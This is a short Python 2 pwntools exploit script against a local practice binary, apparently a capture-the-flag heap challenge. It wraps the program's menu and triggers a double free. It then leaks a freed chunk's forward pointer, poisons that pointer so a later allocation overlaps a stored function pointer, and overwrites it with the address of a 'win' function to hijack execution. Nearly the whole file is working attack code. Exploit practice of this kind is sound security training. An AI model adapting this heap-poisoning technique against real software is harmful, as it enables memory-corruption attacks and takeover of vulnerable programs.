#!/usr/bin/env python2
from pwn import *

global p
p = process("./prac")
 
def menu():
    p.recvuntil("Choice: ")

def make(index,name):
    log.info("Make: {}".format(index))
    p.sendline("a")
    p.recvuntil("Clone ID:",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def edit(index,name):
    log.info("Edit: {}".format(index))
    p.sendline("c")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def kill(index):
    log.info("Kill: {}".format(index))
    p.sendline("b")
    p.recvuntil("Clone ID:")
    p.sendline(str(index))
    menu()

def view(index):
    log.info("View: {}".format(index))
    p.sendline("d")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Name: ",timeout=0.1)
    result = p.recv(4)
    menu()
    return result

def hint(index):
    log.info("Hint: {}".format(index))
    p.sendline("h")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    return p.recvline()


elf = ELF("./prac")

menu()
make(0,"AAAAAAAA")

# double free bug
kill(0)
kill(0)

# leak the fd pointer
leak = u32(view(0))
log.critical("Leaked Pointer: {}".format(hex(leak)))

# change fd pointer by 8 bytes to overlap with hint function pointer
log.critical("New Pointer: {}".format(hex(leak+8)))
make(1,str(p32(leak+8)))
make(2,"")

# allocate new chunk to overwrite hint pointer
make(3,str(p32(elf.symbols["win"])))

log.critical(hint(2))

